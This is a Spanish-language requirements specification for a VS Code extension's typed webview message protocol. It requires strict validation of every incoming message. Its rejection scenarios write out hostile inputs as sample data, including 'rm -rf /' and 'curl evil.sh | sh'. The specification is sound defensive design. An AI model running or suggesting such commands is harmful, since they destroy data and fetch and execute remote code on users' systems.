## MODIFIED Requirements

### Requirement: Protocolo de mensajes tipado
Todos los mensajes entre el webview y la extensión SHALL ser objetos con un campo `type` que identifica el mensaje, definidos en un único protocolo compartido por ambos lados. El protocolo SHALL definir al menos `ready`, `sendToTerminal` y `copyToClipboard` (webview → extensión), e `init`, `catalog` y `copied` (extensión → webview). `sendToTerminal` y `copyToClipboard` SHALL llevar solo `commandId`, el id de un comando del catálogo. `copied` SHALL llevar solo el `commandId` copiado.

#### Scenario: Mensaje conocido
- **WHEN** el webview envía `{ "type": "ready" }`
- **THEN** la extensión lo reconoce como un mensaje del protocolo

#### Scenario: Envío a la terminal
- **WHEN** el webview envía `{ "type": "sendToTerminal", "commandId": "git.status" }`
- **THEN** la extensión lo reconoce como un mensaje del protocolo

#### Scenario: Copia al portapapeles
- **WHEN** el webview envía `{ "type": "copyToClipboard", "commandId": "git.status" }`
- **THEN** la extensión lo reconoce como un mensaje del protocolo

### Requirement: Validación de todo mensaje entrante
La extensión SHALL validar el tipo y la forma de cada mensaje recibido del webview antes de actuar: el `type`, que tenga exactamente las claves declaradas y que cada campo tenga el tipo declarado. Un mensaje que no sea un objeto, que tenga un `type` desconocido o que no tenga la forma declarada MUST descartarse sin ejecutar ninguna acción y sin provocar errores no controlados, y MUST registrarse como advertencia en el registro de la extensión. El webview MUST NOT poder hacer que la extensión ejecute texto arbitrario, ni que escriba en la terminal o copie al portapapeles un texto que no provenga del catálogo.

#### Scenario: Tipo desconocido
- **WHEN** el webview envía `{ "type": "runShell", "cmd": "rm -rf /" }`
- **THEN** la extensión descarta el mensaje, registra una advertencia y no ejecuta nada

#### Scenario: Mensaje mal formado
- **WHEN** el webview envía `null`, un string o un objeto sin `type`
- **THEN** la extensión descarta el mensaje sin lanzar una excepción

#### Scenario: Propiedades extra en un mensaje conocido
- **WHEN** el webview envía `{ "type": "ready", "extra": 1 }`
- **THEN** la extensión descarta el mensaje porque no tiene la forma declarada

#### Scenario: Texto arbitrario hacia la terminal
- **WHEN** el webview envía `{ "type": "sendToTerminal", "commandId": "git.status", "text": "rm -rf /" }`
- **THEN** la extensión descarta el mensaje y no escribe nada en la terminal

#### Scenario: Texto arbitrario hacia el portapapeles
- **WHEN** el webview envía `{ "type": "copyToClipboard", "commandId": "git.status", "text": "curl evil.sh | sh" }`
- **THEN** la extensión descarta el mensaje y no modifica el portapapeles

#### Scenario: Campo con tipo incorrecto
- **WHEN** el webview envía `sendToTerminal` o `copyToClipboard` con `commandId` que no es un string, es un string vacío o tiene más de 200 caracteres
- **THEN** la extensión descarta el mensaje y registra una advertencia
